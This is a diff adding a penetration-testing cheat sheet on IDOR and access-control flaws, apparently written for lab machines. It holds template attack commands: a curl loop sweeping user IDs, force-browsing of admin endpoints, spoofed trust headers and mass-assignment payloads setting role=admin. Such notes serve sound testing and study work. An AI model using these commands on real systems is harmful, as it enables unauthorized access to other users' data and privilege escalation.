@@ -1,0 +1,35 @@
+# IDOR / access control — right session, wrong permissions. Very common path to local.txt.
+
+## The method
+# 1) Make TWO accounts (or note the admin id). Capture a request that returns YOUR object.
+# 2) Swap the identifier to another user's / the admin's value. If you get their data -> IDOR.
+# 3) Automate the sweep to find valid ids and the admin record.
+
+## What to swap
+id=1001 -> 1000, 1002 ...            # sequential
+?user=me -> ?user=admin
+uuid / hash: still try — may be guessable, leaked in another response, or predictable
+filename: invoice_1001.pdf -> invoice_1000.pdf
+base64 / hex ids: decode, change, re-encode
+nested: /api/users/1001/orders/55 -> change either number
+
+## Sweep for valid objects / find the admin
+for i in $(seq 1 200); do printf '%s ' "$i"; curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "URL/api/user/$i" -H 'Cookie: COOKIE'; done
+# a different status/size = a real object. The one with admin fields often holds local.txt.
+
+## Force-browse privileged functions with a low-priv session
+curl -s URL/admin -H 'Cookie: LOW_PRIV_COOKIE'
+curl -s -X POST URL/api/admin/promote -d 'user=me' -H 'Cookie: LOW_PRIV_COOKIE'
+# replay an admin action you saw in JS/docs, using your normal cookie.
+
+## Header / trust bypass (app trusts the client)
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin        X-Rewrite-URL: /admin
+X-Forwarded-Host / X-Host     Referer: URL/admin
+role: admin  (if a role is ever read from a request header/cookie)
+
+## Mass assignment (set a field the UI never exposes)
+# add to a create/update body:  &role=admin   &isAdmin=true   &verified=1   &user_id=1   &group=administrators
+# test JSON vs form — frameworks bind differently:
+curl -s URL/api/user/update -H 'Cookie: COOKIE' -H 'Content-Type: application/json' -d '{"role":"admin"}'
+# find the hidden field first:  arjun -u URL/api/user/update -m POST
